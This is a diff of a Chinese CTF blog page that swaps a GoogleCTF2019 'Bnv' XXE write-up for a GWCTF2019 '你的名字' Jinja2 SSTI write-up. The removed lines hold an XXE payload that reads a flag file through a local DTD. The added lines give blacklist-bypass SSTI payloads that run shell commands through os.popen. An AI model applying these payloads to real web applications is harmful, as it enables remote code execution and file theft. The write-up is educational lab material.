@@ -13,7 +13,7 @@
 
 
 
-<title>Quals]Bnv | Hexo</title>
+<title>[GWCTF2019]你的名字 | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">Quals]Bnv</h1>
+            <h1 class="post-title">[GWCTF2019]你的名字</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">September 18, 2024&nbsp;&nbsp;21:44:01</a>
+                        Date: <a href="#">September 22, 2024&nbsp;&nbsp;20:40:09</a>
                         </span>
                     
                     
@@ -221,29 +221,31 @@
         </header>
 
         <div class="post-content">
-            <h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>先bp抓包发现</p>
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/1.png" alt="1"></p>
-<p>是json数据：由json数据想到是xxe注入，再次基础上修改Content-Type为application&#x2F;xml,发现是少了一个&lt;，感觉是少了一个xml文件的头，加一个</p>
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/2.png" alt="2"></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>
+            <h2 id="GWCTF2019-你的名字"><a href="#GWCTF2019-你的名字" class="headerlink" title="[GWCTF2019]你的名字"></a>[GWCTF2019]你的名字</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/3.png" alt="3"></h2><p>进去就是一个ssti经典：好多东西被禁了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;，union,select,/,/**/ </span><br><span class="line">这是被禁了，会在后面加上！禁了&#123;&#123;&#125;&#125;还以为不是ssti了</span><br><span class="line">然后就没了，虽然知道了也不会做········</span><br><span class="line">它用了&#123;%print %&#125;这种形式，这样就能打印出执行信息了</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/3.png" alt="3"></p>
-<p>报错说是没找到DTD文件，添加DTD文件的实体</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;135601360123502401401250&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>试了下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print lipsum %&#125;，</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/4.png" alt="4"></p>
-<p>报错没有元素消息的声明</p>
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/5.png" alt="5"></p>
-<p>可以看到报错没有元素消息的声明，显然解析器需要在DTD中声明以定义的元素，有点像在使用变量之前声明变量。所以让我们给它想要的，我们要做的就是在DTD中声明消息，我们可以通过使用数据，指定名为message的元素来实现这一点，定义类型设置为PC数据，现在让我们继续尝试。</p>
-<p>这里得说一下DTD<br>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例<br><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/6.png" alt="6"></p>
-<p>回显成功，通过外带数据的形式添加一<img src="/../images/%5BGoogleCTF2019Quals%5DBnv/7.png" alt="7">个外部实体来发出出口请求。</p>
-<p>未加载外部实体，需要使用内部dtd文件加载，（之前还用加载文件的方法，结果标记错误）<img src="/../images/%5BGoogleCTF2019Quals%5DBnv/8.png" alt="8"></p>
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/10.png" alt="10"></p>
-<p>最后的数据：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/4.png" alt="4">终于有回显了，有回显了就好开始下面的构造了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里还得补充一点，&#123;%print %&#125;形式下，若果你构造的payload是正常的ssti用到的语句却没有回显，就说明你的语句中可能有关键字被过滤了，如&#123;%print &#x27;&#x27;.class %&#125;执行之后没有任何的回显，但&#123;%print &#x27;&#x27;.clconfigass %&#125;成功执行有回显，这说明class被过滤了</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/%5BGoogleCTF2019Quals%5DBnv/9.png" alt="9"></p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/114420160">https://blog.csdn.net/cjdgg/article/details/114420160</a></p>
+
+<p>本体的黑名单源代码：</p>
+<p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20240922205525074.png" alt="image-20240922205525074"></p>
+<p>这过滤代码挺傻的，是先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因为config字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行config的过滤，所以我们在过滤字符中加入config就可以绕过</p>
+<p><strong>所以最终的payload可以写成如下形式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__(&#x27;oconfigs&#x27;).poconfigpen(&#x27;whoami&#x27;).read()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>也可以拼接绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print lipsum.__globals__[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;__im&#x27;+&#x27;port__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;)[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;whoami&#x27;).read()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__bui&#x27;+&#x27;ltins__&#x27;%&#125;</span><br><span class="line">&#123;%set b=&#x27;__im&#x27;+&#x27;port__&#x27;%&#125;</span><br><span class="line">&#123;%set c=&#x27;o&#x27;+&#x27;s&#x27;%&#125;</span><br><span class="line">&#123;%set d=&#x27;po&#x27;+&#x27;pen&#x27;%&#125;</span><br><span class="line">&#123;%print(lipsum[&#x27;__globals__&#x27;][a][b](c)[d](&#x27;cat /flag_1s_Hera&#x27;)[&#x27;read&#x27;]())%&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**用&#123;%print %&#125;解决了回显问题，网上的其他大多数文章为了解决无法回显的问题大多是选择外带的形式**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/5.png" alt="5"></p>
 
         </div>
 
@@ -258,7 +260,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/09/18/Quals-Bnv/">http://odiws.github.io/2024/09/18/Quals-Bnv/</a></span>
+                        <span><a href="http://odiws.github.io/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">http://odiws.github.io/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</a></span>
                     </p>
                 
                 
@@ -284,7 +286,7 @@
                     
                         <a href="/tags/buuctf/"># buuctf</a>
                     
-                        <a href="/tags/xxe/"># xxe</a>
+                        <a href="/tags/ssti/"># ssti</a>
                     
                         
                 </span>
@@ -297,10 +299,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/09/22/NPUCTF2020-ezlogin/">[NPUCTF2020]ezlogin</a>
             
-            
-            <a class="next" rel="next" href="/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/">入群题]Web</a>
+            <a class="next" rel="next" href="/2024/09/22/RoarCTF2019-SimpleUpload/">[RoarCTF2019]SimpleUpload</a>
             
         </section>
 
